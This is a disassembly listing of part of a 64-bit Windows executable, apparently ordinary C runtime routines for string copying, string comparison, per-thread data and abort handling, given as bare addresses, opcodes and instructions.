   140006c3d:	48 8d 0d bc 99 00 00 	lea    0x99bc(%rip),%rcx        # 0x140010600
   140006c44:	48 83 c4 28          	add    $0x28,%rsp
   140006c48:	e9 d7 3b 00 00       	jmp    0x14000a824
   140006c4d:	cc                   	int3
   140006c4e:	cc                   	int3
   140006c4f:	cc                   	int3
   140006c50:	48 83 ec 28          	sub    $0x28,%rsp
   140006c54:	e8 0b 05 00 00       	call   0x140007164
   140006c59:	48 8b 40 18          	mov    0x18(%rax),%rax
   140006c5d:	48 85 c0             	test   %rax,%rax
   140006c60:	74 08                	je     0x140006c6a
   140006c62:	ff 15 f0 87 00 00    	call   *0x87f0(%rip)        # 0x14000f458
   140006c68:	eb 00                	jmp    0x140006c6a
   140006c6a:	e8 61 00 00 00       	call   0x140006cd0
   140006c6f:	90                   	nop
   140006c70:	40 53                	rex push %rbx
   140006c72:	48 83 ec 20          	sub    $0x20,%rsp
   140006c76:	33 db                	xor    %ebx,%ebx
   140006c78:	48 85 c9             	test   %rcx,%rcx
   140006c7b:	74 0c                	je     0x140006c89
   140006c7d:	48 85 d2             	test   %rdx,%rdx
   140006c80:	74 07                	je     0x140006c89
   140006c82:	4d 85 c0             	test   %r8,%r8
   140006c85:	75 1b                	jne    0x140006ca2
   140006c87:	88 19                	mov    %bl,(%rcx)
   140006c89:	e8 b2 0a 00 00       	call   0x140007740
   140006c8e:	bb 16 00 00 00       	mov    $0x16,%ebx
   140006c93:	89 18                	mov    %ebx,(%rax)
   140006c95:	e8 86 09 00 00       	call   0x140007620
   140006c9a:	8b c3                	mov    %ebx,%eax
   140006c9c:	48 83 c4 20          	add    $0x20,%rsp
   140006ca0:	5b                   	pop    %rbx
   140006ca1:	c3                   	ret
   140006ca2:	4c 8b c9             	mov    %rcx,%r9
   140006ca5:	4c 2b c1             	sub    %rcx,%r8
   140006ca8:	43 8a 04 08          	mov    (%r8,%r9,1),%al
   140006cac:	41 88 01             	mov    %al,(%r9)
   140006caf:	49 ff c1             	inc    %r9
   140006cb2:	84 c0                	test   %al,%al
   140006cb4:	74 06                	je     0x140006cbc
   140006cb6:	48 83 ea 01          	sub    $0x1,%rdx
   140006cba:	75 ec                	jne    0x140006ca8
   140006cbc:	48 85 d2             	test   %rdx,%rdx
   140006cbf:	75 d9                	jne    0x140006c9a
   140006cc1:	88 19                	mov    %bl,(%rcx)
   140006cc3:	e8 78 0a 00 00       	call   0x140007740
   140006cc8:	bb 22 00 00 00       	mov    $0x22,%ebx
   140006ccd:	eb c4                	jmp    0x140006c93
   140006ccf:	cc                   	int3
   140006cd0:	48 83 ec 28          	sub    $0x28,%rsp
   140006cd4:	e8 cf 3b 00 00       	call   0x14000a8a8
   140006cd9:	48 85 c0             	test   %rax,%rax
   140006cdc:	74 0a                	je     0x140006ce8
   140006cde:	b9 16 00 00 00       	mov    $0x16,%ecx
   140006ce3:	e8 10 3c 00 00       	call   0x14000a8f8
   140006ce8:	f6 05 51 33 01 00 02 	testb  $0x2,0x13351(%rip)        # 0x14001a040
   140006cef:	74 2a                	je     0x140006d1b
   140006cf1:	b9 17 00 00 00       	mov    $0x17,%ecx
   140006cf6:	ff 15 ac 85 00 00    	call   *0x85ac(%rip)        # 0x14000f2a8
   140006cfc:	85 c0                	test   %eax,%eax
   140006cfe:	74 07                	je     0x140006d07
   140006d00:	b9 07 00 00 00       	mov    $0x7,%ecx
   140006d05:	cd 29                	int    $0x29
   140006d07:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140006d0d:	ba 15 00 00 40       	mov    $0x40000015,%edx
   140006d12:	41 8d 48 02          	lea    0x2(%r8),%ecx
   140006d16:	e8 f1 06 00 00       	call   0x14000740c
   140006d1b:	b9 03 00 00 00       	mov    $0x3,%ecx
   140006d20:	e8 bb f7 ff ff       	call   0x1400064e0
   140006d25:	cc                   	int3
   140006d26:	cc                   	int3
   140006d27:	cc                   	int3
   140006d28:	e9 7b 11 00 00       	jmp    0x140007ea8
   140006d2d:	cc                   	int3
   140006d2e:	cc                   	int3
   140006d2f:	cc                   	int3
   140006d30:	cc                   	int3
   140006d31:	cc                   	int3
   140006d32:	cc                   	int3
   140006d33:	cc                   	int3
   140006d34:	cc                   	int3
   140006d35:	cc                   	int3
   140006d36:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140006d3d:	00 00 00 
   140006d40:	48 2b d1             	sub    %rcx,%rdx
   140006d43:	4d 85 c0             	test   %r8,%r8
   140006d46:	74 6a                	je     0x140006db2
   140006d48:	f7 c1 07 00 00 00    	test   $0x7,%ecx
   140006d4e:	74 1d                	je     0x140006d6d
   140006d50:	0f b6 01             	movzbl (%rcx),%eax
   140006d53:	3a 04 0a             	cmp    (%rdx,%rcx,1),%al
   140006d56:	75 5d                	jne    0x140006db5
   140006d58:	48 ff c1             	inc    %rcx
   140006d5b:	49 ff c8             	dec    %r8
   140006d5e:	74 52                	je     0x140006db2
   140006d60:	84 c0                	test   %al,%al
   140006d62:	74 4e                	je     0x140006db2
   140006d64:	48 f7 c1 07 00 00 00 	test   $0x7,%rcx
   140006d6b:	75 e3                	jne    0x140006d50
   140006d6d:	49 bb 80 80 80 80 80 	movabs $0x8080808080808080,%r11
   140006d74:	80 80 80 
   140006d77:	49 ba ff fe fe fe fe 	movabs $0xfefefefefefefeff,%r10
   140006d7e:	fe fe fe 
   140006d81:	8d 04 0a             	lea    (%rdx,%rcx,1),%eax
   140006d84:	25 ff 0f 00 00       	and    $0xfff,%eax
   140006d89:	3d f8 0f 00 00       	cmp    $0xff8,%eax
   140006d8e:	77 c0                	ja     0x140006d50
   140006d90:	48 8b 01             	mov    (%rcx),%rax
   140006d93:	48 3b 04 0a          	cmp    (%rdx,%rcx,1),%rax
   140006d97:	75 b7                	jne    0x140006d50
   140006d99:	48 83 c1 08          	add    $0x8,%rcx
   140006d9d:	49 83 e8 08          	sub    $0x8,%r8
   140006da1:	76 0f                	jbe    0x140006db2
   140006da3:	4d 8d 0c 02          	lea    (%r10,%rax,1),%r9
   140006da7:	48 f7 d0             	not    %rax
   140006daa:	49 23 c1             	and    %r9,%rax
   140006dad:	49 85 c3             	test   %rax,%r11
   140006db0:	74 cf                	je     0x140006d81
   140006db2:	33 c0                	xor    %eax,%eax
   140006db4:	c3                   	ret
   140006db5:	48 1b c0             	sbb    %rax,%rax
   140006db8:	48 83 c8 01          	or     $0x1,%rax
   140006dbc:	c3                   	ret
   140006dbd:	cc                   	int3
   140006dbe:	cc                   	int3
   140006dbf:	cc                   	int3
   140006dc0:	4d 85 c0             	test   %r8,%r8
   140006dc3:	75 18                	jne    0x140006ddd
   140006dc5:	33 c0                	xor    %eax,%eax
   140006dc7:	c3                   	ret
   140006dc8:	0f b7 01             	movzwl (%rcx),%eax
   140006dcb:	66 85 c0             	test   %ax,%ax
   140006dce:	74 13                	je     0x140006de3
   140006dd0:	66 3b 02             	cmp    (%rdx),%ax
   140006dd3:	75 0e                	jne    0x140006de3
   140006dd5:	48 83 c1 02          	add    $0x2,%rcx
   140006dd9:	48 83 c2 02          	add    $0x2,%rdx
   140006ddd:	49 83 e8 01          	sub    $0x1,%r8
   140006de1:	75 e5                	jne    0x140006dc8
   140006de3:	0f b7 01             	movzwl (%rcx),%eax
   140006de6:	0f b7 0a             	movzwl (%rdx),%ecx
   140006de9:	2b c1                	sub    %ecx,%eax
   140006deb:	c3                   	ret
   140006dec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006df1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140006df6:	57                   	push   %rdi
   140006df7:	48 83 ec 20          	sub    $0x20,%rsp
   140006dfb:	49 8b d9             	mov    %r9,%rbx
   140006dfe:	49 8b f8             	mov    %r8,%rdi
   140006e01:	8b 0a                	mov    (%rdx),%ecx
   140006e03:	e8 d0 0f 00 00       	call   0x140007dd8
   140006e08:	90                   	nop
   140006e09:	48 8b 07             	mov    (%rdi),%rax
   140006e0c:	48 8b 08             	mov    (%rax),%rcx
   140006e0f:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140006e16:	f0 ff 00             	lock incl (%rax)
   140006e19:	8b 0b                	mov    (%rbx),%ecx
   140006e1b:	e8 0c 10 00 00       	call   0x140007e2c
   140006e20:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006e25:	48 83 c4 20          	add    $0x20,%rsp
   140006e29:	5f                   	pop    %rdi
   140006e2a:	c3                   	ret
   140006e2b:	cc                   	int3
   140006e2c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006e31:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140006e36:	57                   	push   %rdi
   140006e37:	48 83 ec 20          	sub    $0x20,%rsp
   140006e3b:	49 8b d9             	mov    %r9,%rbx
   140006e3e:	49 8b f8             	mov    %r8,%rdi
   140006e41:	8b 0a                	mov    (%rdx),%ecx
   140006e43:	e8 90 0f 00 00       	call   0x140007dd8
   140006e48:	90                   	nop
   140006e49:	48 8b 0f             	mov    (%rdi),%rcx
   140006e4c:	33 d2                	xor    %edx,%edx
   140006e4e:	48 8b 09             	mov    (%rcx),%rcx
   140006e51:	e8 a6 02 00 00       	call   0x1400070fc
   140006e56:	90                   	nop
   140006e57:	8b 0b                	mov    (%rbx),%ecx
   140006e59:	e8 ce 0f 00 00       	call   0x140007e2c
   140006e5e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006e63:	48 83 c4 20          	add    $0x20,%rsp
   140006e67:	5f                   	pop    %rdi
   140006e68:	c3                   	ret
   140006e69:	cc                   	int3
   140006e6a:	cc                   	int3
   140006e6b:	cc                   	int3
   140006e6c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006e71:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140006e76:	57                   	push   %rdi
   140006e77:	48 83 ec 20          	sub    $0x20,%rsp
   140006e7b:	49 8b d9             	mov    %r9,%rbx
   140006e7e:	49 8b f8             	mov    %r8,%rdi
   140006e81:	8b 0a                	mov    (%rdx),%ecx
   140006e83:	e8 50 0f 00 00       	call   0x140007dd8
   140006e88:	90                   	nop
   140006e89:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140006e8d:	48 8b 10             	mov    (%rax),%rdx
   140006e90:	48 8b 0f             	mov    (%rdi),%rcx
   140006e93:	48 8b 12             	mov    (%rdx),%rdx
   140006e96:	48 8b 09             	mov    (%rcx),%rcx
   140006e99:	e8 5e 02 00 00       	call   0x1400070fc
   140006e9e:	90                   	nop
   140006e9f:	8b 0b                	mov    (%rbx),%ecx
   140006ea1:	e8 86 0f 00 00       	call   0x140007e2c
   140006ea6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006eab:	48 83 c4 20          	add    $0x20,%rsp
   140006eaf:	5f                   	pop    %rdi
   140006eb0:	c3                   	ret
   140006eb1:	cc                   	int3
   140006eb2:	cc                   	int3
   140006eb3:	cc                   	int3
   140006eb4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006eb9:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140006ebe:	57                   	push   %rdi
   140006ebf:	48 83 ec 20          	sub    $0x20,%rsp
   140006ec3:	49 8b d9             	mov    %r9,%rbx
   140006ec6:	49 8b f8             	mov    %r8,%rdi
   140006ec9:	8b 0a                	mov    (%rdx),%ecx
   140006ecb:	e8 08 0f 00 00       	call   0x140007dd8
   140006ed0:	90                   	nop
   140006ed1:	48 8b 07             	mov    (%rdi),%rax
   140006ed4:	48 8b 08             	mov    (%rax),%rcx
   140006ed7:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   140006ede:	48 85 c9             	test   %rcx,%rcx
   140006ee1:	74 1e                	je     0x140006f01
   140006ee3:	83 c8 ff             	or     $0xffffffff,%eax
   140006ee6:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   140006eea:	83 f8 01             	cmp    $0x1,%eax
   140006eed:	75 12                	jne    0x140006f01
   140006eef:	48 8d 05 da 32 01 00 	lea    0x132da(%rip),%rax        # 0x14001a1d0
   140006ef6:	48 3b c8             	cmp    %rax,%rcx
   140006ef9:	74 06                	je     0x140006f01
   140006efb:	e8 20 10 00 00       	call   0x140007f20
   140006f00:	90                   	nop
   140006f01:	8b 0b                	mov    (%rbx),%ecx
   140006f03:	e8 24 0f 00 00       	call   0x140007e2c
   140006f08:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006f0d:	48 83 c4 20          	add    $0x20,%rsp
   140006f11:	5f                   	pop    %rdi
   140006f12:	c3                   	ret
   140006f13:	cc                   	int3
   140006f14:	40 55                	rex push %rbp
   140006f16:	48 8b ec             	mov    %rsp,%rbp
   140006f19:	48 83 ec 50          	sub    $0x50,%rsp
   140006f1d:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
   140006f21:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140006f25:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140006f29:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   140006f2d:	ba 01 00 00 00       	mov    $0x1,%edx
   140006f32:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   140006f36:	b8 05 00 00 00       	mov    $0x5,%eax
   140006f3b:	89 45 20             	mov    %eax,0x20(%rbp)
   140006f3e:	89 45 28             	mov    %eax,0x28(%rbp)
   140006f41:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140006f45:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140006f49:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   140006f4d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140006f51:	b8 04 00 00 00       	mov    $0x4,%eax
   140006f56:	89 45 d0             	mov    %eax,-0x30(%rbp)
   140006f59:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   140006f5c:	48 8d 05 cd 45 01 00 	lea    0x145cd(%rip),%rax        # 0x14001b530
   140006f63:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140006f67:	89 51 28             	mov    %edx,0x28(%rcx)
   140006f6a:	48 8d 0d 8f 95 00 00 	lea    0x958f(%rip),%rcx        # 0x140010500
   140006f71:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140006f75:	48 89 08             	mov    %rcx,(%rax)
   140006f78:	48 8d 0d 51 32 01 00 	lea    0x13251(%rip),%rcx        # 0x14001a1d0
   140006f7f:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140006f83:	89 90 a8 03 00 00    	mov    %edx,0x3a8(%rax)
   140006f89:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140006f8d:	48 89 88 88 00 00 00 	mov    %rcx,0x88(%rax)
   140006f94:	8d 4a 42             	lea    0x42(%rdx),%ecx
   140006f97:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140006f9b:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   140006f9f:	66 89 88 bc 00 00 00 	mov    %cx,0xbc(%rax)
   140006fa6:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140006faa:	66 89 88 c2 01 00 00 	mov    %cx,0x1c2(%rax)
   140006fb1:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140006fb5:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140006fb9:	48 83 a0 a0 03 00 00 	andq   $0x0,0x3a0(%rax)
   140006fc0:	00 
   140006fc1:	e8 26 fe ff ff       	call   0x140006dec
   140006fc6:	4c 8d 4d d0          	lea    -0x30(%rbp),%r9
   140006fca:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   140006fce:	48 8d 55 d4          	lea    -0x2c(%rbp),%rdx
   140006fd2:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140006fd6:	e8 91 fe ff ff       	call   0x140006e6c
   140006fdb:	48 83 c4 50          	add    $0x50,%rsp
   140006fdf:	5d                   	pop    %rbp
   140006fe0:	c3                   	ret
   140006fe1:	cc                   	int3
   140006fe2:	cc                   	int3
   140006fe3:	cc                   	int3
   140006fe4:	48 85 c9             	test   %rcx,%rcx
   140006fe7:	74 1a                	je     0x140007003
   140006fe9:	53                   	push   %rbx
   140006fea:	48 83 ec 20          	sub    $0x20,%rsp
   140006fee:	48 8b d9             	mov    %rcx,%rbx
   140006ff1:	e8 0e 00 00 00       	call   0x140007004
   140006ff6:	48 8b cb             	mov    %rbx,%rcx
   140006ff9:	e8 22 0f 00 00       	call   0x140007f20
   140006ffe:	48 83 c4 20          	add    $0x20,%rsp
   140007002:	5b                   	pop    %rbx
   140007003:	c3                   	ret
   140007004:	40 55                	rex push %rbp
   140007006:	48 8b ec             	mov    %rsp,%rbp
   140007009:	48 83 ec 40          	sub    $0x40,%rsp
   14000700d:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   140007011:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   140007015:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140007019:	48 8d 15 e0 94 00 00 	lea    0x94e0(%rip),%rdx        # 0x140010500
   140007020:	b8 05 00 00 00       	mov    $0x5,%eax
   140007025:	89 45 20             	mov    %eax,0x20(%rbp)
   140007028:	89 45 28             	mov    %eax,0x28(%rbp)
   14000702b:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   14000702f:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140007033:	b8 04 00 00 00       	mov    $0x4,%eax
   140007038:	89 45 e0             	mov    %eax,-0x20(%rbp)
   14000703b:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   14000703e:	48 8b 01             	mov    (%rcx),%rax
   140007041:	48 3b c2             	cmp    %rdx,%rax
   140007044:	74 0c                	je     0x140007052
   140007046:	48 8b c8             	mov    %rax,%rcx
   140007049:	e8 d2 0e 00 00       	call   0x140007f20
   14000704e:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140007052:	48 8b 49 70          	mov    0x70(%rcx),%rcx
   140007056:	e8 c5 0e 00 00       	call   0x140007f20
   14000705b:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   14000705f:	48 8b 49 58          	mov    0x58(%rcx),%rcx
   140007063:	e8 b8 0e 00 00       	call   0x140007f20
   140007068:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   14000706c:	48 8b 49 60          	mov    0x60(%rcx),%rcx
   140007070:	e8 ab 0e 00 00       	call   0x140007f20
   140007075:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140007079:	48 8b 49 68          	mov    0x68(%rcx),%rcx
   14000707d:	e8 9e 0e 00 00       	call   0x140007f20
   140007082:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140007086:	48 8b 49 48          	mov    0x48(%rcx),%rcx
   14000708a:	e8 91 0e 00 00       	call   0x140007f20
   14000708f:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140007093:	48 8b 49 50          	mov    0x50(%rcx),%rcx
   140007097:	e8 84 0e 00 00       	call   0x140007f20
   14000709c:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400070a0:	48 8b 49 78          	mov    0x78(%rcx),%rcx
   1400070a4:	e8 77 0e 00 00       	call   0x140007f20
   1400070a9:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400070ad:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   1400070b4:	e8 67 0e 00 00       	call   0x140007f20
   1400070b9:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400070bd:	48 8b 89 c0 03 00 00 	mov    0x3c0(%rcx),%rcx
   1400070c4:	e8 57 0e 00 00       	call   0x140007f20
   1400070c9:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   1400070cd:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   1400070d1:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   1400070d5:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   1400070d9:	e8 d6 fd ff ff       	call   0x140006eb4
   1400070de:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   1400070e2:	4c 8d 45 f8          	lea    -0x8(%rbp),%r8
   1400070e6:	48 8d 55 e4          	lea    -0x1c(%rbp),%rdx
   1400070ea:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   1400070ee:	e8 39 fd ff ff       	call   0x140006e2c
   1400070f3:	48 83 c4 40          	add    $0x40,%rsp
   1400070f7:	5d                   	pop    %rbp
   1400070f8:	c3                   	ret
   1400070f9:	cc                   	int3
   1400070fa:	cc                   	int3
   1400070fb:	cc                   	int3
   1400070fc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007101:	57                   	push   %rdi
   140007102:	48 83 ec 20          	sub    $0x20,%rsp
   140007106:	48 8b f9             	mov    %rcx,%rdi
   140007109:	48 8b da             	mov    %rdx,%rbx
   14000710c:	48 8b 89 90 00 00 00 	mov    0x90(%rcx),%rcx
   140007113:	48 85 c9             	test   %rcx,%rcx
   140007116:	74 2c                	je     0x140007144
   140007118:	e8 47 34 00 00       	call   0x14000a564
   14000711d:	48 8b 8f 90 00 00 00 	mov    0x90(%rdi),%rcx
   140007124:	48 3b 0d 05 44 01 00 	cmp    0x14405(%rip),%rcx        # 0x14001b530
   14000712b:	74 17                	je     0x140007144
   14000712d:	48 8d 05 2c 2f 01 00 	lea    0x12f2c(%rip),%rax        # 0x14001a060
   140007134:	48 3b c8             	cmp    %rax,%rcx
   140007137:	74 0b                	je     0x140007144
   140007139:	83 79 10 00          	cmpl   $0x0,0x10(%rcx)
   14000713d:	75 05                	jne    0x140007144
   14000713f:	e8 20 32 00 00       	call   0x14000a364
   140007144:	48 89 9f 90 00 00 00 	mov    %rbx,0x90(%rdi)
   14000714b:	48 85 db             	test   %rbx,%rbx
   14000714e:	74 08                	je     0x140007158
   140007150:	48 8b cb             	mov    %rbx,%rcx
   140007153:	e8 80 31 00 00       	call   0x14000a2d8
   140007158:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000715d:	48 83 c4 20          	add    $0x20,%rsp
   140007161:	5f                   	pop    %rdi
   140007162:	c3                   	ret
   140007163:	cc                   	int3
   140007164:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007169:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000716e:	57                   	push   %rdi
   14000716f:	48 83 ec 20          	sub    $0x20,%rsp
   140007173:	ff 15 57 7f 00 00    	call   *0x7f57(%rip)        # 0x14000f0d0
   140007179:	8b 0d d1 2e 01 00    	mov    0x12ed1(%rip),%ecx        # 0x14001a050
   14000717f:	8b d8                	mov    %eax,%ebx
   140007181:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140007184:	74 1f                	je     0x1400071a5
   140007186:	e8 c9 08 00 00       	call   0x140007a54
   14000718b:	48 8b f8             	mov    %rax,%rdi
   14000718e:	48 85 c0             	test   %rax,%rax
   140007191:	74 0c                	je     0x14000719f
   140007193:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140007197:	75 73                	jne    0x14000720c
   140007199:	33 ff                	xor    %edi,%edi
   14000719b:	33 f6                	xor    %esi,%esi
   14000719d:	eb 70                	jmp    0x14000720f
   14000719f:	8b 0d ab 2e 01 00    	mov    0x12eab(%rip),%ecx        # 0x14001a050
   1400071a5:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   1400071a9:	e8 ee 08 00 00       	call   0x140007a9c
   1400071ae:	85 c0                	test   %eax,%eax
   1400071b0:	74 e7                	je     0x140007199
   1400071b2:	ba c8 03 00 00       	mov    $0x3c8,%edx
   1400071b7:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400071bc:	e8 e7 0c 00 00       	call   0x140007ea8
   1400071c1:	8b 0d 89 2e 01 00    	mov    0x12e89(%rip),%ecx        # 0x14001a050
   1400071c7:	48 8b f8             	mov    %rax,%rdi
   1400071ca:	48 85 c0             	test   %rax,%rax
   1400071cd:	75 10                	jne    0x1400071df
   1400071cf:	33 d2                	xor    %edx,%edx
   1400071d1:	e8 c6 08 00 00       	call   0x140007a9c
   1400071d6:	33 c9                	xor    %ecx,%ecx
   1400071d8:	e8 43 0d 00 00       	call   0x140007f20
   1400071dd:	eb ba                	jmp    0x140007199
   1400071df:	48 8b d7             	mov    %rdi,%rdx
   1400071e2:	e8 b5 08 00 00       	call   0x140007a9c
   1400071e7:	85 c0                	test   %eax,%eax
   1400071e9:	75 12                	jne    0x1400071fd
   1400071eb:	8b 0d 5f 2e 01 00    	mov    0x12e5f(%rip),%ecx        # 0x14001a050
   1400071f1:	33 d2                	xor    %edx,%edx
   1400071f3:	e8 a4 08 00 00       	call   0x140007a9c
   1400071f8:	48 8b cf             	mov    %rdi,%rcx
   1400071fb:	eb db                	jmp    0x1400071d8
   1400071fd:	48 8b cf             	mov    %rdi,%rcx
   140007200:	e8 0f fd ff ff       	call   0x140006f14
   140007205:	33 c9                	xor    %ecx,%ecx
   140007207:	e8 14 0d 00 00       	call   0x140007f20
   14000720c:	48 8b f7             	mov    %rdi,%rsi
   14000720f:	8b cb                	mov    %ebx,%ecx
   140007211:	ff 15 e1 80 00 00    	call   *0x80e1(%rip)        # 0x14000f2f8
   140007217:	48 f7 df             	neg    %rdi
   14000721a:	48 1b c0             	sbb    %rax,%rax
   14000721d:	48 23 c6             	and    %rsi,%rax
   140007220:	74 10                	je     0x140007232
   140007222:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007227:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000722c:	48 83 c4 20          	add    $0x20,%rsp
   140007230:	5f                   	pop    %rdi
   140007231:	c3                   	ret
   140007232:	e8 99 fa ff ff       	call   0x140006cd0
   140007237:	cc                   	int3
   140007238:	40 53                	rex push %rbx
   14000723a:	48 83 ec 20          	sub    $0x20,%rsp
   14000723e:	8b 0d 0c 2e 01 00    	mov    0x12e0c(%rip),%ecx        # 0x14001a050
   140007244:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140007247:	74 1b                	je     0x140007264
   140007249:	e8 06 08 00 00       	call   0x140007a54
   14000724e:	48 8b d8             	mov    %rax,%rbx
   140007251:	48 85 c0             	test   %rax,%rax
   140007254:	74 08                	je     0x14000725e
   140007256:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000725a:	74 7d                	je     0x1400072d9
   14000725c:	eb 6d                	jmp    0x1400072cb
   14000725e:	8b 0d ec 2d 01 00    	mov    0x12dec(%rip),%ecx        # 0x14001a050
   140007264:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140007268:	e8 2f 08 00 00       	call   0x140007a9c
   14000726d:	85 c0                	test   %eax,%eax
   14000726f:	74 68                	je     0x1400072d9
   140007271:	ba c8 03 00 00       	mov    $0x3c8,%edx
   140007276:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000727b:	e8 28 0c 00 00       	call   0x140007ea8
   140007280:	8b 0d ca 2d 01 00    	mov    0x12dca(%rip),%ecx        # 0x14001a050
   140007286:	48 8b d8             	mov    %rax,%rbx
   140007289:	48 85 c0             	test   %rax,%rax
   14000728c:	75 10                	jne    0x14000729e
   14000728e:	33 d2                	xor    %edx,%edx
   140007290:	e8 07 08 00 00       	call   0x140007a9c
   140007295:	33 c9                	xor    %ecx,%ecx
   140007297:	e8 84 0c 00 00       	call   0x140007f20
   14000729c:	eb 3b                	jmp    0x1400072d9
   14000729e:	48 8b d3             	mov    %rbx,%rdx
   1400072a1:	e8 f6 07 00 00       	call   0x140007a9c
   1400072a6:	85 c0                	test   %eax,%eax
   1400072a8:	75 12                	jne    0x1400072bc
   1400072aa:	8b 0d a0 2d 01 00    	mov    0x12da0(%rip),%ecx        # 0x14001a050
   1400072b0:	33 d2                	xor    %edx,%edx
   1400072b2:	e8 e5 07 00 00       	call   0x140007a9c
   1400072b7:	48 8b cb             	mov    %rbx,%rcx
   1400072ba:	eb db                	jmp    0x140007297
   1400072bc:	48 8b cb             	mov    %rbx,%rcx
   1400072bf:	e8 50 fc ff ff       	call   0x140006f14
   1400072c4:	33 c9                	xor    %ecx,%ecx
   1400072c6:	e8 55 0c 00 00       	call   0x140007f20
   1400072cb:	48 85 db             	test   %rbx,%rbx
   1400072ce:	74 09                	je     0x1400072d9
   1400072d0:	48 8b c3             	mov    %rbx,%rax
   1400072d3:	48 83 c4 20          	add    $0x20,%rsp
   1400072d7:	5b                   	pop    %rbx
   1400072d8:	c3                   	ret
   1400072d9:	e8 f2 f9 ff ff       	call   0x140006cd0
   1400072de:	cc                   	int3
   1400072df:	cc                   	int3
   1400072e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400072e5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400072ea:	57                   	push   %rdi
   1400072eb:	48 83 ec 20          	sub    $0x20,%rsp
   1400072ef:	ff 15 db 7d 00 00    	call   *0x7ddb(%rip)        # 0x14000f0d0
   1400072f5:	8b 0d 55 2d 01 00    	mov    0x12d55(%rip),%ecx        # 0x14001a050
   1400072fb:	8b d8                	mov    %eax,%ebx
   1400072fd:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140007300:	74 1f                	je     0x140007321
   140007302:	e8 4d 07 00 00       	call   0x140007a54
   140007307:	48 8b f8             	mov    %rax,%rdi
   14000730a:	48 85 c0             	test   %rax,%rax
   14000730d:	74 0c                	je     0x14000731b
   14000730f:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140007313:	75 73                	jne    0x140007388
   140007315:	33 ff                	xor    %edi,%edi
   140007317:	33 f6                	xor    %esi,%esi
   140007319:	eb 70                	jmp    0x14000738b
   14000731b:	8b 0d 2f 2d 01 00    	mov    0x12d2f(%rip),%ecx        # 0x14001a050
